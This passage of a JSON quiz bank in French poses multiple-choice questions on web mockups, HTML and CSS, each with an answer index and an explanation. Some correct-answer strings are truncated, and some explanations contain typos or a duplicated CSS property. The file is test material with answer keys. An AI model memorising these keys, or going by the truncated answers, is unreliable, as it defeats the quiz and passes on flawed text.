                "En demandant aux développeurs d'ajouter des fonctionnalités d'animation complexes.",
                "En appliquant la charte graphique de l'entreprise (couleurs, typographies, logo, style visuel) sur la structure filaire.",
                "En convertissant automatiquement les croquis papier en prototypes fonctionnels via un outil d'intelligence artificielle."
            ],
            "correct": 2,
            "explanation": "Le passage du wireframe (schéma fonctionnel filaire basse fidélité) à la maquette se fait en y appliquant l'identité visuelle et la charte graphique de l'entreprise (couleurs, polices, styles, images) pour donner un rendu visuel fidèle du produit final."
        }
    ],
    "Le HTML": [
        {
            "theme": "Le HTML",
            "question": "Qu'est-ce que HTML ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un protocole réseau",
                "Un langage de programmation",
                "HTML (HyperText Markup Language) est le langage standard utilisé pour créer des pages web",
                "Un logiciel de design graphique"
            ],
            "correct": 2,
            "explanation": "HTML (HyperText Markup Language) est le langage standard utilisé pour créer des pages web.\nIl sert à structurer le contenu sur le web, en utilisant des balises pour définir des éléments comme des titres, des paragraphes, des images et des liens.\nHTML a été créé par <b>Tim Berners-Lee</b> en 1989 au CERN (Organisation européenne pour la recherche nuclefaire)."
        },
        {
            "theme": "Le HTML",
            "question": "Quelle balise HTML5 est utilisée pour définir un contenu principal d'une page ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "&lt;main>",
                "&lt;content>",
                "&lt;primary>",
                "&lt;section>"
            ],
            "correct": 0,
            "explanation": "La balise &lt;main> est spécifiquement conçue en HTML5 pour marquer le contenu principal d'un document, celui qui est directement lié au sujet central de la page."
        },
        {
            "theme": "Le HTML",
            "question": "Quelle est la différence entre HTML et XHTML ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Aucune",
                "XHTML permet de créer ses propres balises",
                "HTML est un langage de balisage plus permissif, tandis que XHTML (Extensible HyperText Markup Language) est une version plus stricte de HTML basée sur XML",
                "HTML n'existe plus il a été remplacé par XHTML"
            ],
            "correct": 2,
            "explanation": "HTML est un langage de balisage plus permissif, tandis que XHTML (Extensible HyperText Markup Language) est une version plus stricte de HTML basée sur XML.\nXHTML impose des règles de syntaxe plus rigoureuses, comme la nécessité de fermer toutes les balises et d'utiliser des noms de balises en minuscules."
        },
        {
            "theme": "Le HTML",
            "question": "Quelles sont les principales versions de HTML et quelles sont leurs différences ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "HTML, HTML2, HTML3, HTML4, HTML5, HTML6",
                "HTML, XHTML, HTML4",
                "HTML2, HTML3.2, HTML4.01, XHTML, HTML5 ",
                "HTML2, XHTML, HTML5"
            ],
            "correct": 2,
            "explanation": "Voici les principales versions de HTML avec leur année de sortie et leurs changements majeurs :\n\tHTML 2.0 (1995) introduit les formulaires et les tables, c'est la première version standardisée;\n\tHTML 3.2 (1997) ajoute du support pour les feuilles de style, les scripts et les applets;\n\tHTML 4.01 (1999) améliore de l'accessibilité, internationalisation, et séparation du contenu et de la présentation;\n XHTML 1.0 (2000) reformule le HTML 4.01 en XML, avec une syntaxe plus stricte;\n\tHTML5 (2014) introduit des éléments sémantiques, le support natif de l'audio et de la vidéo, le canvas pour le dessin, et l'amélioration des formulaires."
        },
        {
            "theme": "Le HTML",
            "question": "Qu'est-ce qu'une balise HTML ? Comment est-elle structurée ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Une balise HTML est une commande JavaScript permettant d’ajouter du style et des animations aux pages web.",
                "Une balise HTML est un élément de base qui définit le contenu d'une page web",
                "Une balise HTML est un fichier de configuration qui indique au navigateur comment exécuter le code CSS et JavaScript d’un site.",
                "Une balise HTML est un symbole utilisé uniquement pour commenter le code et n’a aucun impact sur la structure ou le contenu d’une page web."
            ],
            "correct": 1,
            "explanation": "Une balise HTML est un élément de base qui définit le contenu d'une page web.\nElle est généralement structurée avec une balise d'ouverture et une balise de fermeture.\n&lt;balise propriete=\"valeur\">contenu&lt;/balise>"
        },
        {
            "theme": "Le HTML",
            "question": "Qu'est-ce qu'un attribut dans une balise HTML ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un attribut HTML est une fonction JavaScript intégrée utilisée pour créer des interactions dynamiques dans une page web.",
                "Un attribut HTML est une balise spéciale servant à relier plusieurs pages entre elles via des liens internes.",
                "Un attribut fournit des informations supplémentaires sur une balise HTML.",
                "Un attribut HTML est un élément de style utilisé pour définir la couleur et la mise en page d’un texte sans passer par le CSS."
            ],
            "correct": 2,
            "explanation": "Un attribut fournit des informations supplémentaires sur une balise HTML.\nPar exemple, dans la balise ci-dessous type et readonly sont des attributs.\n&lt;input type=\"text\" readonly>"
        },
        {
            "theme": "Le HTML",
            "question": "Qu'est-ce que le DOCTYPE en HTML ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Le DOCTYPE est une déclaration qui informe le navigateur du type de document et de la version de HTML utilisée.",
                "Le DOCTYPE est une balise utilisée pour définir le titre de la page qui s’affiche dans l’onglet du navigateur.",
                "Le DOCTYPE est un attribut CSS qui permet de déterminer le style par défaut du document HTML.",
                "Le DOCTYPE est une fonction JavaScript qui initialise le chargement du DOM avant l’exécution du script principal."
            ],
            "correct": 0,
            "explanation": "Le DOCTYPE est une déclaration qui informe le navigateur du type de document et de la version de HTML utilisée.\nIl est important, car il permet au navigateur de créer correctement la page en respectant les standards du web.\nVous pouvez le déclarer de cette manière-là :\n&lt;!DOCTYPE html>"
        },
        {
            "theme": "Le HTML",
            "question": "Quelle est la structure de base d'un fichier HTML ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un fichier HTML commence toujours par une déclaration &lt;module> suivie d'une section &lt;content> qui contient le &lt;head> et le &lt;body>",
                "La structure de base d'un fichier HTML comprend les éléments suivants :\n\t- La déclaration DOCTYPE;\n\t- L'élément &lt;html> avec l'attribut de langue;\n\t- La section &lt;head> contenant les métadonnées;\n\t- La section &lt;body> contenant le contenu visible de la page",
                "La structure de base est composée uniquement d'un &lt;container> racine qui regroupe des &lt;block> pour le style et le contenu ; il n'y a pas besoin de balises &lt;html>, &lt;head> ou &lt;body>",
                "Un fichier HTML standard démarre par &lt;doctype html5> en majuscules, puis une balise &lt;page> enveloppe &lt;meta> et &lt;view>"
            ],
            "correct": 1,
            "explanation": "La structure de base d'un fichier HTML comprend les éléments suivants:\n\t- La déclaration DOCTYPE;\n\t- L'élément &lt;html> avec l'attribut de langue;\n\t- La section &lt;head> contenant les métadonnées;\n\t- La section &lt;body> contenant le contenu visible de la page.\n\nVoici un exemple de structure de base :\n&lt;!DOCTYPE html>\n&lt;html lang=\"fr\">\n&lt;head>\n  &lt;meta charset=\"UTF-8\">\n  &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  &lt;title>Document&lt;/title>\n&lt;/head>\n&lt;body>\n\n&lt;/body>\n&lt;/html>"
        },
        {
            "theme": "Le HTML",
            "question": "Comment le HTML interagit-il avec le CSS et le JavaScript ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Le HTML structure le contenu d'une page, tandis que le CSS (Cascading Style Sheets) est utilisé pour la mise en forme et le style.",
                "Le HTML exécute directement le code CSS et JavaScript sans qu’il soit nécessaire de les lier ou de les importer dans la page.",
                "Le HTML contient des fonctions internes qui remplacent totalement l’usage du CSS et du JavaScript pour gérer le style et les interactions.",
                "Le HTML communique avec le CSS et le JavaScript uniquement par l’intermédiaire du serveur web, avant que la page ne soit envoyée au navigateur."
            ],
            "correct": 0,
            "explanation": "Le HTML structure le contenu d'une page, tandis que le CSS (Cascading Style Sheets) est utilisé pour la mise en forme et le style.\nLe JavaScript , quant à lui, permet d'ajouter de l'interactivité à la page en manipulant le DOM (Document Object Model) généré par HTML."
        },
        {
            "theme": "Le HTML",
            "question": "Comment les métadonnées sont-elles utilisées dans une page HTML ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Les métadonnées servent à afficher du texte supplémentaire à l’utilisateur sous forme de commentaires visibles dans le navigateur.",
                "Les métadonnées permettent de stocker des variables JavaScript utilisées pour exécuter des fonctions dynamiques sur la page.",
                "Les métadonnées sont des informations sur la page qui ne sont pas affichées directement à l'utilisateur, mais qui fournissent des données importantes aux navigateurs et aux moteurs de recherche",
                "Les métadonnées sont utilisées pour définir la structure visuelle de la page, comme la mise en page, les couleurs et la typographie."
            ],
            "correct": 2,
            "explanation": "Les métadonnées sont des informations sur la page qui ne sont pas affichées directement à l'utilisateur, mais qui fournissent des données importantes aux navigateurs et aux moteurs de recherche.\nElles sont généralement définies dans la section &lt;head> de la page HTML, principalement avec des balises &lt;meta>.\nCi-dessous sont présentés des exemples courants de métadonnées.\nEncodage des caractères :\n&lt;meta charset=\"UTF-8\">\nDescription de la page (importante pour le SEO) :\n&lt;meta\n  name=\"description\"\n  content=\"Description concise de la page pour les moteurs de recherche\"\n>\nMots-clefs (moins utilisés aujourd'hui pour le SEO) :\n&lt;meta\n  name=\"keywords\"\n  content=\"mot-clef1, mot-clef2, mot-clef3\">\nAuteur de la page :\n&lt;meta\n  name=\"author\"\n  content=\"Nom de l'auteur\">\nViewport pour le responsive design :\n&lt;meta\n  name=\"viewport\"\n  content=\"width=device-width, initial-scale=1.0\">\nRobots (instructions pour les moteurs de recherche) :\n&lt;meta\n  name=\"robots\"\n  content=\"index, follow\"\n>"
        },
        {
            "theme": "Le HTML",
            "question": "Qu'est-ce que le HTML sémantique ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Le HTML sémantique désigne l'utilisation de balises HTML qui transmettent la signification du contenu qu'elles renferment.",
                "Le HTML sémantique est une version spéciale du HTML utilisée uniquement pour créer des animations et des effets visuels avancés.",
                "Le HTML sémantique est un langage dérivé du XML permettant de structurer les bases de données relationnelles directement dans le navigateur.",
                "Le HTML sémantique est un ensemble de balises réservées à la mise en forme graphique des éléments sans utiliser de CSS."
            ],
            "correct": 0,
            "explanation": "Le HTML sémantique désigne l'utilisation de balises HTML qui transmettent la signification du contenu qu'elles renferment.\nIl est important, car il améliore l'accessibilité pour les technologies d'assistance.\nIl favorise aussi le référencement naturel (SEO) en permettant aux moteurs de recherche de mieux comprendre la structure et le contenu de la page."
        },
        {
            "theme": "Le HTML",
            "question": "Comment créer des liens internes et externes en HTML ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Utilisez la balise lien &lt;lien src=\"mapage.html\">",
                "Utilisez la balise &lt;a> avec l'attribut src pointant vers un identifiant dans la même page :\n&lt;a src=\"#section1\">\n Aller à la section 1\n</a>\n\nPour créer un lien externe , utilisez également la balise &lt;a> avec l'URL complète : &lt;a href=\"https://www\">www&lt;/a>",
                "Utilisez la balise link &lt;link src=\"mapage.html\">",
                "Utilisez la balise &lt;a> avec l'attribut href pointant vers un identifiant dans la même page :\n&lt;a href=\"#section1\">\n  Aller à la section 1\n</a>\n\nPour créer un lien externe , utilisez également la balise &lt;a> avec l'URL complète : &lt;a href=\"https://www\">www&lt;/a>"
            ],
            "correct": 3,
            "explanation": "Pour créer un lien interne , utilisez la balise &lt;a> avec l'attribut href pointant vers un identifiant dans la même page :\n&lt;a href=\"#section1\">\n  Aller à la section 1\n&lt;/a>\n\nPour créer un lien externe , utilisez également la balise &lt;a> avec l'URL complète :\n&lt;a href=\"https://www.example.com\">Visitez Example&lt;/a>."
        },
        {
            "theme": "Le HTML",
            "question": "Comment utiliser les commentaires dans le code HTML ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "ce n'est pas possible",
                "en utilisant la balise &lt;comment>",
                "en utilisant la balise &lt;code>",
                "Les commentaires en HTML sont utilisés pour ajouter des notes ou des explications dans le code sans qu'elles soient affichées dans le navigateur"
            ],
            "correct": 3,
            "explanation": "Les commentaires en HTML sont utilisés pour ajouter des notes ou des explications dans le code sans qu'elles soient affichées dans le navigateur.\nIls sont écrits en utilisant la syntaxe suivante : &lt;!-- Ceci est un commentaire -->."
        },
        {
            "theme": "Le HTML",
            "question": "Qu'est-ce que l'attribut data-* en HTML ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "L’attribut data-* est utilisé pour importer automatiquement des fichiers externes (comme des scripts ou des images) dans une page HTML.",
                "L'attribut data- * est un attribut personnalisé qui permet de stocker des données supplémentaires sur un élément HTML.",
                "L’attribut data-* permet de définir le style CSS d’un élément directement dans la balise sans utiliser la propriété style.",
                "L’attribut data-* sert à créer des animations HTML sans recourir à JavaScript ni à des bibliothèques externes."
            ],
            "correct": 1,
            "explanation": "L'attribut data- * est un attribut personnalisé qui permet de stocker des données supplémentaires sur un élément HTML.\n\nDans l'exemple ci-dessous, on peut utiliser le data-user-id afin de manipuler l'élément en question.\n&lt;div data-user-id=\"12345\">Contenu&lt;/div>"
        },
        {
            "theme": "Le HTML",
            "question": "Comment éviter les erreurs dans l'écriture du HTML ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "En écrivant tout le code HTML en majuscules, car les navigateurs interprètent mieux les balises lorsqu’elles sont uniformisées.",
                "Il est important de valider le code HTML avec des outils comme le validateur W3C pour détecter les erreurs de syntaxe",
                "En désactivant la validation automatique du navigateur pour éviter que des messages d’erreurs n’interrompent l’affichage de la page.",
                "En ajoutant systématiquement la balise &lt;validate> en haut du document pour forcer le navigateur à corriger automatiquement les erreurs."
            ],
            "correct": 1,
            "explanation": "Il est important de valider le code HTML avec des outils comme le validateur W3C pour détecter les erreurs de syntaxe.\n\nVoici quelques conseils pour éviter les erreurs :\n\t- Utiliser des balises correctement fermées.\n\t- S'assurer que les attributs sont bien écrits.\n\t- Éviter les balises imbriquées incorrectement."
        },
        {
            "theme": "Le HTML",
            "question": "Comment optimiser le chargement des ressources en HTML ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Regrouper tous les fichiers CSS et JavaScript dans un seul &lt;script> ou &lt;style> en ligne placé au début du &lt;head> pour que le navigateur télécharge tout en priorité.",
                "Pour optimiser le chargement des ressources en HTML, vous pouvez :\n\t- Utiliser des balises &lt;link> et &lt;script> avec l'attribut defer ou async pour charger les scripts de manière asynchrone",
                "Charger chaque image et police dans un &lt;iframe> séparé afin que le navigateur ouvre plusieurs connexions parallèles et accélère l'affichage global.",
                "Dupliquer systématiquement les mêmes fichiers CSS et JS sur plusieurs URLs différentes pour forcer le navigateur à récupérer la version la plus rapide à chaque visite."
            ],
            "correct": 1,
            "explanation": "Pour optimiser le chargement des ressources en HTML, vous pouvez :\n\t- Utiliser des balises &lt;link> et &lt;script> avec l'attribut defer ou async pour charger les scripts de manière asynchrone.\n\t- Minimiser le nombre de requêtes HTTP en combinant les fichiers CSS et JavaScript.\n\t- Compresser les images et utiliser des formats modernes comme WebP."
        },
        {
            "theme": "Le HTML",
            "question": "Pourquoi utiliser une balise <section> plutôt qu'un simple <div> ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "<section> affiche le contenu différemment de <div> dans tous les navigateurs",
                "<section> se charge plus rapidement que <div>",
                "<section> porte un sens sémantique : elle délimite une section thématique du document, ce qui aide les technologies d'assistance et le référencement, alors que <div> est un conteneur neutre",
                "<div> est obsolète en HTML5 et ne doit plus jamais être utilisé"
            ],
            "correct": 2,
            "explanation": "<div> est un conteneur générique sans signification, utile uniquement pour grouper des éléments à des fins de style.\n<section> indique un regroupement thématique de contenu, généralement accompagné d'un titre (<h2> à <h6>).\nUtiliser des balises sémantiques améliore :\n- l'accessibilité : les lecteurs d'écran peuvent naviguer par sections ;\n- le SEO : les moteurs de recherche comprennent mieux la structure de la page.\nEn entretien, on précisera qu'un <div> reste adapté lorsqu'il n'existe pas de balise sémantique pertinente (groupement purement visuel)."
        },
        {
            "theme": "Le HTML",
            "question": "Comment améliorer le référencement naturel (SEO) d'une page web ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Uniquement en achetant des publicités sur les moteurs de recherche",
                "En plaçant le plus de mots-clés possible dans la page, même sans rapport avec le contenu",
                "En empêchant les robots des moteurs de recherche d'accéder à la page pour éviter le contenu dupliqué",
                "En utilisant du HTML sémantique, des balises title et meta description pertinentes, une hiérarchie de titres cohérente, des attributs alt sur les images, des URL lisibles et un contenu de qualité"
            ],
            "correct": 3,
            "explanation": "Le SEO (Search Engine Optimization) regroupe les pratiques qui améliorent la position d'une page dans les résultats naturels des moteurs de recherche.\nLes leviers principaux sont :\n- des balises sémantiques (header, nav, main, article, footer) ;\n- une balise <title> unique par page et une meta description accrocheuse ;\n- une hiérarchie de titres correcte (un seul <h1>, puis <h2>, <h3>...) ;\n- des attributs alt sur les images ;\n- des URL courtes et lisibles ;\n- la performance (temps de chargement) et la compatibilité mobile ;\n- un contenu original, structuré et mis à jour.\nLe 'keyword stuffing' (bourrage de mots-clés) est une pratique pénalisée par les moteurs de recherche."
        }
    ],
    "Le CSS": [
        {
            "theme": "Le CSS",
            "question": "Qu'est-ce que CSS ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "CSS (Cascading Style Sheets) est un langage de feuilles de style utilisé pour décrire la présentation d'un document structuré en HTML",
                "Un gestionnaire de base de données",
                "Un langage de programmation orienté objet",
                "Un compilateur"
            ],
            "correct": 0,
            "explanation": "CSS (Cascading Style Sheets) est un langage de feuilles de style utilisé pour décrire la présentation d'un document structuré en HTML.\nIl permet de contrôler l'apparence et la mise en forme des éléments sur une page web, comme les couleurs, les polices, les tailles, les positionnements, etc."
        },
        {
            "theme": "Le CSS",
            "question": "Comment centrer un élément horizontalement avec CSS Flexbox ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "justify-content: center",
                "align-items: center",
                "text-align: center",
                "margin: auto"
            ],
            "correct": 0,
            "explanation": "justify-content: center permet de centrer les éléments flex horizontalement le long de l'axe principal du conteneur flex."
        },
        {
            "theme": "Le CSS",
            "question": "Quelle propriété CSS permet de créer des colonnes égales dans une grille ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "grid-template-columns: 1fr 1fr",
                "display: grid",
                "grid-gap: 10px",
                "grid-auto-rows: 1fr"
            ],
            "correct": 0,
            "explanation": "grid-template-columns: 1fr 1fr crée deux colonnes de taille égale, où 1fr représente une fraction de l'espace disponible."
        },
        {
            "theme": "Le CSS",
            "question": "Qu'est-ce qu'un sélecteur ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un gestionnaire de base de données",
                "Un compilateur",
                "Un sélecteur en CSS est un motif utilisé pour sélectionner les éléments HTML que vous souhaitez styliser",
                "Un langage de programmation orienté objet"
            ],
            "correct": 2,
            "explanation": "Un sélecteur en CSS est un motif utilisé pour sélectionner les éléments HTML que vous souhaitez styliser.\nLes sélecteurs permettent d'appliquer des styles spécifiques à des éléments particuliers ou à des groupes d'éléments.\n\nVoici quelques exemples de sélecteurs.\nLe sélecteur de balise cible tous les balises d'un type particulier.\np {\n    color: blue;\n} \n\nLe sélecteur de classe cible tous les éléments ayant la classe indiquée.\n.ma-classe {\n    font-size: 16px;\n} \n\nLe sélecteur d'identifiant cible tous les éléments ayant l'id précisé.\n#mon-id {\n    background-color: yellow;\n} \n\nLe sélecteur d'attribut cible tous les éléments &lt;input> de type retenu.\ninput[type = 'text'] {\n    border: 1px solid black;\n} \n\nLe sélecteur descendant cible tous les éléments qui sont descendants d'un autre (ci-dessous tous les &lt;p> descendant de &lt;di>).\n div p {\n    margin: 10px;\n}"
        },
        {
            "theme": "Le CSS",
            "question": "Quelle est la différence entre les sélecteurs de classes et d'identifiants en CSS ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un gestionnaire de base de données",
                "Les sélecteurs de classes en CSS permettent d'appliquer des styles à des éléments en fonction de leur classe, par exemple : ",
                "Un compilateur",
                "Un langage de programmation orienté objet"
            ],
            "correct": 1,
            "explanation": "Les sélecteurs de classes en CSS permettent d'appliquer des styles à des éléments en fonction de leur classe, par exemple :\n.ma-classe { ... }.\n\nLes sélecteurs d'identifiants , quant à eux, ciblent des éléments uniques avec un identifiant unique, par exemple :\n#mon-id { ... }. \n\nLes identifiants ont une priorité plus élevée que les classes."
        },
        {
            "theme": "Le CSS",
            "question": "Comment appliquer des styles CSS à un document HTML ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un compilateur",
                "Il existe trois façons d'appliquer des styles CSS à un document HTML :\n\t- Styles en ligne : &lt;p style=\"color: red;\">Texte rouge&lt;/p>\n\t- Balise &lt;style> dans l'en-tête : &lt;style> p { color: red; } &lt;/style> \n\t- Feuille de style externe : &lt;link rel=\"stylesheet\" href=\"styles",
                "Un langage de programmation orienté objet",
                "Un gestionnaire de base de données"
            ],
            "correct": 1,
            "explanation": "Il existe trois façons d'appliquer des styles CSS à un document HTML :\n\t- Styles en ligne :\n&lt;p style=\"color: red;\">Texte rouge&lt;/p>\n\t- Balise &lt;style> dans l'en-tête :\n&lt;style> p { color: red; } &lt;/style>\n\t- Feuille de style externe :\n&lt;link rel=\"stylesheet\" href=\"styles.css\">"
        },
        {
            "theme": "Le CSS",
            "question": "Qu'est-ce que le modèle de boîte en CSS ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un compilateur",
                "Le modèle de boîte en HTML et en CSS décrit la façon dont les éléments sont affichés et dimensionnés sur une page",
                "Un langage de programmation orienté objet",
                "Un gestionnaire de base de données"
            ],
            "correct": 1,
            "explanation": "Le modèle de boîte en HTML et en CSS décrit la façon dont les éléments sont affichés et dimensionnés sur une page.\nChaque élément est considéré comme une boîte, avec des propriétés telles que la marge, la bordure, le remplissage et le contenu.\n\nEn modulant, chacune d'entre-elles, vous pouvez faire évoluer votre mise en page."
        },
        {
            "theme": "Le CSS",
            "question": "Comment fonctionne le positionnement en CSS (static, relative, absolute, fixed) ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un compilateur",
                "Un langage de programmation orienté objet",
                "Le CSS offre différentes options de positionnement : - Static (par défaut) : positionnement normal dans le flux du document",
                "Un gestionnaire de base de données"
            ],
            "correct": 2,
            "explanation": "Le CSS offre différentes options de positionnement :\n\t- Static (par défaut) : positionnement normal dans le flux du document.\n\t- Relative : positionnement par rapport à sa position normale.\n\t- Absolute : positionnement par rapport au parent positionné le plus proche.\n\t- Fixed : positionnement par rapport à la fenêtre du navigateur."
        },
        {
            "theme": "Le CSS",
            "question": "Qu'est-ce que Flexbox ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un langage de programmation orienté objet",
                "Un gestionnaire de base de données",
                "Flexbox (Flexible Box Layout) est un module CSS conçu pour faciliter la création de mises en page flexibles et réactives",
                "Un compilateur"
            ],
            "correct": 2,
            "explanation": "Flexbox (Flexible Box Layout) est un module CSS conçu pour faciliter la création de mises en page flexibles et réactives.\n\tIl introduit un modèle de disposition unidimensionnel, permettant d'organiser les éléments en lignes ou en colonnes.\n\nOn peut retenir les caractéristiques suivantes :\n\t- la direction qui permet de définir l'axe principal (horizontal ou vertical) le long duquel les éléments sont disposés;\n\t- l' alignement qui offre un contrôle précis sur la position des éléments le long des axes principal et secondaire;\n\t- l' ordre qui permet de modifier l'ordre d'affichage des éléments indépendamment de leur ordre dans le DOM;\n\t- la flexibilité permettant aux éléments de grandir ou rétrécir en fonction de l'espace disponible;\n\t- la distribution de l'espace qui gère efficacement la répartition de l'espace entre et autour des éléments.\nFlexbox est particulièrement utile pour créer des mises en page responsives, des barres de navigation, des grilles simples, et pour centrer des éléments verticalement et horizontalement.\nIl simplifie considérablement de nombreux défis de mise en page qui étaient auparavant complexes avec les méthodes CSS traditionnelles."
        },
        {
            "theme": "Le CSS",
            "question": "Qu'est-ce que CSS Grid ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un compilateur",
                "Un gestionnaire de base de données",
                "Un langage de programmation orienté objet",
                "Le module CSS Grid est un système de mise en page en deux dimensions qui permet de diviser une page en lignes et colonnes"
            ],
            "correct": 3,
            "explanation": "Le module CSS Grid est un système de mise en page en deux dimensions qui permet de diviser une page en lignes et colonnes.\nIl offre un contrôle précis sur la disposition des éléments dans un espace bidimensionnel.\nOn peut retenir les caractéristiques suivantes :\n\t- les grilles explicites qui permettent de définir précisément le nombre et la taille des lignes et des colonnes;\n\t- les grilles implicites qui sont générées automatiquement lorsque le contenu déborde de la grille explicite;\n\t- le positionnement qui permet de placer des éléments dans des cellules spécifiques de la grille;\n\t- le contrôle de la taille des lignes et des colonnes, avec des unités flexibles comme fr (fraction);\n\t- les espaces (gutters) entre les lignes et les colonnes, facilement ajustables;\n\t- l' alignement du contenu à l'intérieur des cellules de la grille. CSS Grid est particulièrement efficace pour créer des mises en page complexes, des interfaces utilisateur responsives, et des structures de page entières.\nIl offre une flexibilité et un contrôle supérieurs à ceux des méthodes de mise en page traditionnelles, permettant des designs plus sophistiqués avec moins de code."
        },
        {
            "theme": "Le CSS",
            "question": "Comment gérer les polices et les typographies en CSS ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un gestionnaire de base de données",
                "Un langage de programmation orienté objet",
                "Un compilateur",
                "Le CSS permet de contrôler les polices et les typographies de différentes manières : - Utiliser des propriétés comme font-family , font-size , font-weight , etc"
            ],
            "correct": 3,
            "explanation": "Le CSS permet de contrôler les polices et les typographies de différentes manières :\n\t- Utiliser des propriétés comme font-family , font-size , font-weight , etc.\n\t- Importer des polices externes avec @font-face ou des services de polices en ligne.\n\t- Utiliser des unités relatives comme em et rem pour une mise à l'échelle flexible."
        },
        {
            "theme": "Le CSS",
            "question": "Qu'est-ce qu'une pseudo-classe et comment l'utiliser ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un gestionnaire de base de données",
                "Un langage de programmation orienté objet",
                "Un compilateur",
                "Une pseudo-classe en CSS est un mot-clef ajouté à un sélecteur qui spécifie un état particulier de l'élément ciblé"
            ],
            "correct": 3,
            "explanation": "Une pseudo-classe en CSS est un mot-clef ajouté à un sélecteur qui spécifie un état particulier de l'élément ciblé.\n\nL'exemple ci-dessous cible les liens lorsque l'utilisateur survole l'élément avec la souris.\na:hover {\n  color: red;\n}"
        },
        {
            "theme": "Le CSS",
            "question": "Comment créer des animations et des transitions en CSS ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Un gestionnaire de base de données",
                "Le CSS permet de créer des animations et des transitions de différentes manières",
                "Un compilateur",
                "Un langage de programmation orienté objet"
            ],
            "correct": 1,
            "explanation": "Le CSS permet de créer des animations et des transitions de différentes manières.\n\t- Au travers des ransitions en utilisant les propriétés transition-property , transition-duration , etc. pour animer les changements d'état.\n\t- Au travers des animations en définissant des keyframes avec @keyframes et appliquez-les avec la propriété animation."
        },
        {
            "theme": "Le CSS",
            "question": "Qu'est-ce que la spécificité en CSS ? Comment fonctionne-t-elle ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un gestionnaire de base de données",
                "Un langage de programmation orienté objet",
                "Un compilateur",
                "La spécificité en CSS est un système de points qui détermine quelle règle CSS a la priorité pour un élément donné"
            ],
            "correct": 3,
            "explanation": "La spécificité en CSS est un système de points qui détermine quelle règle CSS a la priorité pour un élément donné.\nElle se fonde sur le nombre et le type de sélecteurs utilisés.\nLes identifiants ont la priorité la plus élevée, suivis des classes, des attributs et des éléments.\n\nVoici comment la spécificité est calculée :\n\t- Identifiant avec 100 points, \n\t- Classe, attribut et pseudo-classe avec 10 points, \n\t- Élément et pseudo-élément avec 1 point. \n\nPar exemple, si vous avez les règles suivantes :\n#mon-id { color: red; }\n\n.ma-classe { color: blue; }\n\np { color: green; }\nPour un élément &lt;p class=\"ma-classe\" id=\"mon-id\">, la spécificité est calculée comme suit :\n\t- la règle #mon-id vaut 100 points,\n\t- la règle .ma-classe vaut 10 points,\n\t- la règle p vaut 1 point.\nL'élément &lt;p class=\"ma-classe\" id=\"mon-id\"> aura la couleur de texte rouge, car l'identifiant a une spécificité plus élevée que la classe, qui a elle-même une spécificité plus élevée que l'élément."
        },
        {
            "theme": "Le CSS",
            "question": "Comment utiliser les variables CSS ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un langage de programmation orienté objet",
                "Les variables CSS , également connues sous le nom de Custom Properties , permettent de stocker et de réutiliser des valeurs dans une feuille de style",
                "Un compilateur",
                "Un gestionnaire de base de données"
            ],
            "correct": 1,
            "explanation": "Les variables CSS , également connues sous le nom de Custom Properties , permettent de stocker et de réutiliser des valeurs dans une feuille de style.\nDéfinissez une variable avec -- et référencez-la avec var().\nElles peuvent être déclarées au niveau global ou local. \n\nVoici un exemple de déclaration et d'utilisation :\n:root {\n    --primary-color: #3498db;\n    --secondary-color: #2ecc71;\n}\n\nbody {\n    color: var(--primary-color);\n}\n\n.button {\n    color: var(--secondary-color);\n    color: white;\n    padding: 10px 20px;\n    border: none;\n    border-radius: 5px;\n    cursor: pointer;\n}"
        },
        {
            "theme": "Le CSS",
            "question": "Qu'est-ce qu'un préprocesseur CSS ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Un compilateur",
                "Un préprocesseur CSS est un langage qui étend les fonctionnalités de CSS, permettant d'utiliser des fonctionnalités avancées comme les variables, les mixins, les fonctions et l'imbrication",
                "Un langage de programmation orienté objet",
                "Un gestionnaire de base de données"
            ],
            "correct": 1,
